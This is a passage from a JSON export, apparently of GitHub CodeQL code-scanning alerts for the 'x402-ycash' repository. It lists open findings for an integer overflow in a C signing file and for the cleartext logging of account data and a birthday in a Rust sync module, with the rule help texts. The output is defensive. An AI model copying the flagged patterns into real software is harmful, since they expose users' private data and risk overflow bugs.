+  "linked_issues": []
+ },
+ {
+  "number": 34,
+  "created_at": "2026-10-23T06:18:52Z",
+  "updated_at": "2026-10-23T06:18:52Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/34",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/34",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "cpp/integer-multiplication-cast-to-long",
+   "severity": "warning",
+   "description": "Multiplication result converted to larger type",
+   "name": "cpp/integer-multiplication-cast-to-long",
+   "tags": [
+    "correctness",
+    "external/cwe/cwe-190",
+    "external/cwe/cwe-192",
+    "external/cwe/cwe-197",
+    "external/cwe/cwe-681",
+    "reliability",
+    "security",
+    "types"
+   ],
+   "full_description": "A multiplication result that is converted to a larger type can be a sign that the result can overflow the type converted from.",
+   "help": "# Multiplication result converted to larger type\nThis rule finds code that converts the result of an integer multiplication to a larger type. Since the conversion applies *after* the multiplication, arithmetic overflow may still occur.\n\nThe rule flags every multiplication of two non-constant integer expressions that is (explicitly or implicitly) converted to a larger integer type. The conversion is an indication that the expression would produce a result that would be too large to fit in the smaller integer type.\n\n\n## Recommendation\nUse a cast to ensure that the multiplication is done using the larger integer type to avoid overflow.\n\n\n## Example\n\n```cpp\nint i = 2000000000;\nlong j = i * i; //Wrong: due to overflow on the multiplication between ints, \n                //will result to j being -1651507200, not 4000000000000000000\n\nlong k = (long) i * i; //Correct: the multiplication is done on longs instead of ints, \n                       //and will not overflow\n\nlong l = static_cast<long>(i) * i; //Correct: modern C++\n\n```\n\n## References\n* MSDN Library: [Multiplicative Operators and the Modulus Operator](https://docs.microsoft.com/en-us/cpp/cpp/multiplicative-operators-and-the-modulus-operator).\n* Cplusplus.com: [Integer overflow](http://www.cplusplus.com/articles/DE18T05o/).\n* Common Weakness Enumeration: [CWE-190](https://cwe.mitre.org/data/definitions/190.html).\n* Common Weakness Enumeration: [CWE-192](https://cwe.mitre.org/data/definitions/192.html).\n* Common Weakness Enumeration: [CWE-197](https://cwe.mitre.org/data/definitions/197.html).\n* Common Weakness Enumeration: [CWE-681](https://cwe.mitre.org/data/definitions/681.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"c-cpp\"}",
+   "category": "codeql-c-cpp",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "Multiplication result may overflow 'int' before it is converted to 'int64_t'."
+   },
+   "location": {
+    "path": "python/x402_ycash/pq/_falcon_c/sign.c",
+    "start_line": 1154,
+    "end_line": 1154,
+    "start_column": 39,
+    "end_column": 46
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/34/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 33,
+  "created_at": "2026-10-23T06:18:46Z",
+  "updated_at": "2026-10-23T06:18:46Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/33",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/33",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "rust/cleartext-logging",
+   "severity": "warning",
+   "description": "Cleartext logging of sensitive information",
+   "name": "rust/cleartext-logging",
+   "tags": [
+    "external/cwe/cwe-312",
+    "external/cwe/cwe-359",
+    "external/cwe/cwe-532",
+    "security"
+   ],
+   "full_description": "Logging sensitive information in plaintext can expose it to an attacker.",
+   "help": "# Cleartext logging of sensitive information\nSensitive user data and system information that is logged could be exposed to an attacker when it is displayed. Also, external processes often store the standard output and standard error streams of an application, which will include logged sensitive information.\n\n\n## Recommendation\nDo not log sensitive data. If it is necessary to log sensitive data, encrypt it before logging.\n\n\n## Example\nThe following example code logs user credentials (in this case, their password) in plaintext:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed to {password}\");\n\n```\nInstead, you should encrypt the credentials, or better still, omit them entirely:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed\");\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* OWASP: [Logging Cheat Sheet - Data to exclude](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html#data-to-exclude).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"rust\"}",
+   "category": "codeql-rust",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This operation writes self.account() to a log file."
+   },
+   "location": {
+    "path": "light/src/sync.rs",
+    "start_line": 639,
+    "end_line": 639,
+    "start_column": 13,
+    "end_column": 20
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/33/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 32,
+  "created_at": "2026-10-23T06:18:46Z",
+  "updated_at": "2026-10-23T06:18:46Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/32",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/32",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "rust/cleartext-logging",
+   "severity": "warning",
+   "description": "Cleartext logging of sensitive information",
+   "name": "rust/cleartext-logging",
+   "tags": [
+    "external/cwe/cwe-312",
+    "external/cwe/cwe-359",
+    "external/cwe/cwe-532",
+    "security"
+   ],
+   "full_description": "Logging sensitive information in plaintext can expose it to an attacker.",
+   "help": "# Cleartext logging of sensitive information\nSensitive user data and system information that is logged could be exposed to an attacker when it is displayed. Also, external processes often store the standard output and standard error streams of an application, which will include logged sensitive information.\n\n\n## Recommendation\nDo not log sensitive data. If it is necessary to log sensitive data, encrypt it before logging.\n\n\n## Example\nThe following example code logs user credentials (in this case, their password) in plaintext:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed to {password}\");\n\n```\nInstead, you should encrypt the credentials, or better still, omit them entirely:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed\");\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* OWASP: [Logging Cheat Sheet - Data to exclude](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html#data-to-exclude).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"rust\"}",
+   "category": "codeql-rust",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This operation writes self.account() to a log file."
+   },
+   "location": {
+    "path": "light/src/sync.rs",
+    "start_line": 624,
+    "end_line": 624,
+    "start_column": 41,
+    "end_column": 48
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/32/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 31,
+  "created_at": "2026-10-23T06:18:46Z",
+  "updated_at": "2026-10-23T06:18:46Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/31",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/31",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "rust/cleartext-logging",
+   "severity": "warning",
+   "description": "Cleartext logging of sensitive information",
+   "name": "rust/cleartext-logging",
+   "tags": [
+    "external/cwe/cwe-312",
+    "external/cwe/cwe-359",
+    "external/cwe/cwe-532",
+    "security"
+   ],
+   "full_description": "Logging sensitive information in plaintext can expose it to an attacker.",
+   "help": "# Cleartext logging of sensitive information\nSensitive user data and system information that is logged could be exposed to an attacker when it is displayed. Also, external processes often store the standard output and standard error streams of an application, which will include logged sensitive information.\n\n\n## Recommendation\nDo not log sensitive data. If it is necessary to log sensitive data, encrypt it before logging.\n\n\n## Example\nThe following example code logs user credentials (in this case, their password) in plaintext:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed to {password}\");\n\n```\nInstead, you should encrypt the credentials, or better still, omit them entirely:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed\");\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* OWASP: [Logging Cheat Sheet - Data to exclude](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html#data-to-exclude).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"rust\"}",
+   "category": "codeql-rust",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This operation writes self.account() to a log file."
+   },
+   "location": {
+    "path": "light/src/sync.rs",
+    "start_line": 623,
+    "end_line": 623,
+    "start_column": 59,
+    "end_column": 66
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/31/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 30,
+  "created_at": "2026-10-23T06:18:46Z",
+  "updated_at": "2026-10-23T06:18:46Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/30",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/30",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "rust/cleartext-logging",
+   "severity": "warning",
+   "description": "Cleartext logging of sensitive information",
+   "name": "rust/cleartext-logging",
+   "tags": [
+    "external/cwe/cwe-312",
+    "external/cwe/cwe-359",
+    "external/cwe/cwe-532",
+    "security"
+   ],
+   "full_description": "Logging sensitive information in plaintext can expose it to an attacker.",
+   "help": "# Cleartext logging of sensitive information\nSensitive user data and system information that is logged could be exposed to an attacker when it is displayed. Also, external processes often store the standard output and standard error streams of an application, which will include logged sensitive information.\n\n\n## Recommendation\nDo not log sensitive data. If it is necessary to log sensitive data, encrypt it before logging.\n\n\n## Example\nThe following example code logs user credentials (in this case, their password) in plaintext:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed to {password}\");\n\n```\nInstead, you should encrypt the credentials, or better still, omit them entirely:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed\");\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* OWASP: [Logging Cheat Sheet - Data to exclude](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html#data-to-exclude).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"rust\"}",
+   "category": "codeql-rust",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This operation writes self.account() to a log file."
+   },
+   "location": {
+    "path": "light/src/sync.rs",
+    "start_line": 609,
+    "end_line": 609,
+    "start_column": 41,
+    "end_column": 48
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/30/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 29,
+  "created_at": "2026-10-23T06:18:46Z",
+  "updated_at": "2026-10-23T06:18:46Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/29",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/29",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "rust/cleartext-logging",
+   "severity": "warning",
+   "description": "Cleartext logging of sensitive information",
+   "name": "rust/cleartext-logging",
+   "tags": [
+    "external/cwe/cwe-312",
+    "external/cwe/cwe-359",
+    "external/cwe/cwe-532",
+    "security"
+   ],
+   "full_description": "Logging sensitive information in plaintext can expose it to an attacker.",
+   "help": "# Cleartext logging of sensitive information\nSensitive user data and system information that is logged could be exposed to an attacker when it is displayed. Also, external processes often store the standard output and standard error streams of an application, which will include logged sensitive information.\n\n\n## Recommendation\nDo not log sensitive data. If it is necessary to log sensitive data, encrypt it before logging.\n\n\n## Example\nThe following example code logs user credentials (in this case, their password) in plaintext:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed to {password}\");\n\n```\nInstead, you should encrypt the credentials, or better still, omit them entirely:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed\");\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* OWASP: [Logging Cheat Sheet - Data to exclude](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html#data-to-exclude).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"rust\"}",
+   "category": "codeql-rust",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This operation writes self.account() to a log file."
+   },
+   "location": {
+    "path": "light/src/sync.rs",
+    "start_line": 602,
+    "end_line": 602,
+    "start_column": 59,
+    "end_column": 66
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/29/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 28,
+  "created_at": "2026-10-23T06:18:46Z",
+  "updated_at": "2026-10-23T06:18:46Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/28",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/28",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "rust/cleartext-logging",
+   "severity": "warning",
+   "description": "Cleartext logging of sensitive information",
+   "name": "rust/cleartext-logging",
+   "tags": [
+    "external/cwe/cwe-312",
+    "external/cwe/cwe-359",
+    "external/cwe/cwe-532",
+    "security"
+   ],
+   "full_description": "Logging sensitive information in plaintext can expose it to an attacker.",
+   "help": "# Cleartext logging of sensitive information\nSensitive user data and system information that is logged could be exposed to an attacker when it is displayed. Also, external processes often store the standard output and standard error streams of an application, which will include logged sensitive information.\n\n\n## Recommendation\nDo not log sensitive data. If it is necessary to log sensitive data, encrypt it before logging.\n\n\n## Example\nThe following example code logs user credentials (in this case, their password) in plaintext:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed to {password}\");\n\n```\nInstead, you should encrypt the credentials, or better still, omit them entirely:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed\");\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* OWASP: [Logging Cheat Sheet - Data to exclude](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html#data-to-exclude).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"rust\"}",
+   "category": "codeql-rust",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This operation writes self.account() to a log file."
+   },
+   "location": {
+    "path": "light/src/sync.rs",
+    "start_line": 587,
+    "end_line": 587,
+    "start_column": 46,
+    "end_column": 61
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/28/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 27,
+  "created_at": "2026-10-23T06:18:46Z",
+  "updated_at": "2026-10-23T06:18:46Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/27",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/27",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "rust/cleartext-logging",
+   "severity": "warning",
+   "description": "Cleartext logging of sensitive information",
+   "name": "rust/cleartext-logging",
+   "tags": [
+    "external/cwe/cwe-312",
+    "external/cwe/cwe-359",
+    "external/cwe/cwe-532",
+    "security"
+   ],
+   "full_description": "Logging sensitive information in plaintext can expose it to an attacker.",
+   "help": "# Cleartext logging of sensitive information\nSensitive user data and system information that is logged could be exposed to an attacker when it is displayed. Also, external processes often store the standard output and standard error streams of an application, which will include logged sensitive information.\n\n\n## Recommendation\nDo not log sensitive data. If it is necessary to log sensitive data, encrypt it before logging.\n\n\n## Example\nThe following example code logs user credentials (in this case, their password) in plaintext:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed to {password}\");\n\n```\nInstead, you should encrypt the credentials, or better still, omit them entirely:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed\");\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* OWASP: [Logging Cheat Sheet - Data to exclude](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html#data-to-exclude).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"rust\"}",
+   "category": "codeql-rust",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This operation writes self.account() to a log file."
+   },
+   "location": {
+    "path": "light/src/sync.rs",
+    "start_line": 551,
+    "end_line": 551,
+    "start_column": 40,
+    "end_column": 76
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/27/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 26,
+  "created_at": "2026-10-23T06:18:46Z",
+  "updated_at": "2026-10-23T06:18:46Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/26",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/26",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "rust/cleartext-logging",
+   "severity": "warning",
+   "description": "Cleartext logging of sensitive information",
+   "name": "rust/cleartext-logging",
+   "tags": [
+    "external/cwe/cwe-312",
+    "external/cwe/cwe-359",
+    "external/cwe/cwe-532",
+    "security"
+   ],
+   "full_description": "Logging sensitive information in plaintext can expose it to an attacker.",
+   "help": "# Cleartext logging of sensitive information\nSensitive user data and system information that is logged could be exposed to an attacker when it is displayed. Also, external processes often store the standard output and standard error streams of an application, which will include logged sensitive information.\n\n\n## Recommendation\nDo not log sensitive data. If it is necessary to log sensitive data, encrypt it before logging.\n\n\n## Example\nThe following example code logs user credentials (in this case, their password) in plaintext:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed to {password}\");\n\n```\nInstead, you should encrypt the credentials, or better still, omit them entirely:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed\");\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* OWASP: [Logging Cheat Sheet - Data to exclude](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html#data-to-exclude).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"rust\"}",
+   "category": "codeql-rust",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This operation writes self.account() to a log file."
+   },
+   "location": {
+    "path": "light/src/sync.rs",
+    "start_line": 550,
+    "end_line": 550,
+    "start_column": 59,
+    "end_column": 66
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/26/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 25,
+  "created_at": "2026-10-23T06:18:46Z",
+  "updated_at": "2026-10-23T06:18:46Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/25",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/25",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "rust/cleartext-logging",
+   "severity": "warning",
+   "description": "Cleartext logging of sensitive information",
+   "name": "rust/cleartext-logging",
+   "tags": [
+    "external/cwe/cwe-312",
+    "external/cwe/cwe-359",
+    "external/cwe/cwe-532",
+    "security"
+   ],
+   "full_description": "Logging sensitive information in plaintext can expose it to an attacker.",
+   "help": "# Cleartext logging of sensitive information\nSensitive user data and system information that is logged could be exposed to an attacker when it is displayed. Also, external processes often store the standard output and standard error streams of an application, which will include logged sensitive information.\n\n\n## Recommendation\nDo not log sensitive data. If it is necessary to log sensitive data, encrypt it before logging.\n\n\n## Example\nThe following example code logs user credentials (in this case, their password) in plaintext:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed to {password}\");\n\n```\nInstead, you should encrypt the credentials, or better still, omit them entirely:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed\");\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* OWASP: [Logging Cheat Sheet - Data to exclude](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html#data-to-exclude).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"rust\"}",
+   "category": "codeql-rust",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This operation writes birthday to a log file."
+   },
+   "location": {
